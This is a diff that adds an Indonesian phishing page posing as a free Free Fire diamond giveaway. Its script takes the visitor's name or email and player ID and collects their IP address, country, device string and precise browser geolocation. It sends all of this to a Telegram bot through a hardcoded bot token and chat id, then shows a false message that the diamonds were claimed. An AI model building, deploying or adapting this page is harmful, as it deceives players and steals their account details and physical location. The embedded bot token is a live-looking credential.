@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Klaim Diamond Free Fire</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: url('https://i.postimg.cc/Kj1wGm84/00431be089336659059b24ee2b5f9503.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: Arial, sans-serif;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background-color: rgba(0, 0, 0, 0.7);
+      padding: 30px 40px;
+      border-radius: 15px;
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+    }
+    input, button {
+      width: 100%;
+      padding: 15px;
+      margin: 10px 0;
+      font-size: 16px;
+      border-radius: 8px;
+      border: none;
+    }
+    button {
+      background-color: #ffcc00;
+      color: black;
+      font-weight: bold;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Klaim Diamond Gratis</h2>
+    <form id="diamondForm">
+      <input type="text" id="namaEmail" placeholder="Masukkan Nama atau Email" required><br>
+      <input type="tel" id="idPlayer" placeholder="Masukkan ID Player" required><br>
+      <button type="submit">Kirim</button>
+    </form>
+  </div>
+
+  <script>
+    const token = "7922660800:AAHLTFLjA-aDkZ_AeuODlZ_jOZ3Aw4KVhKs";
+    const chat_id = "7625804862";
+    let userLocation = null;
+
+    function countryToFlagEmoji(countryCode) {
+      return countryCode.toUpperCase().replace(/./g, char =>
+        String.fromCodePoint(127397 + char.charCodeAt())
+      );
+    }
+
+    function requestLocationPermission() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            userLocation = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude
+            };
+          },
+          function(error) {
+            console.log("Lokasi tidak diizinkan atau tidak tersedia.");
+          }
+        );
+      } else {
+        console.log("Geolokasi tidak didukung oleh browser ini.");
+      }
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      requestLocationPermission();
+    });
+
+    document.getElementById("diamondForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      const nama = document.getElementById("namaEmail").value;
+      const id = document.getElementById("idPlayer").value;
+      const perangkat = navigator.userAgent;
+
+      fetch('https://ipapi.co/json')
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip;
+          const negara = data.country_name;
+          const emoji = countryToFlagEmoji(data.country_code);
+
+          let lokasi = "Tidak Diizinkan";
+          if (userLocation) {
+            const { latitude, longitude } = userLocation;
+            lokasi = `https://www.google.com/maps?q=${latitude},${longitude}`;
+          }
+
+          const pesan = `
+[+] DATA BARU MASUK [+]
+Nama/Email: ${nama}
+ID Player: ${id}
+IP: ${ip}
+Negara: ${negara} ${emoji}
+Perangkat: ${perangkat}
+Lokasi: ${lokasi}
+          `;
+
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chat_id, text: pesan })
+          }).then(() => {
+            alert("Diamond berhasil diklaim! Silakan cek di dalam game.");
+            document.getElementById("diamondForm").reset();
+          });
+        });
+    });
+  </script>
+</body>
+</html>
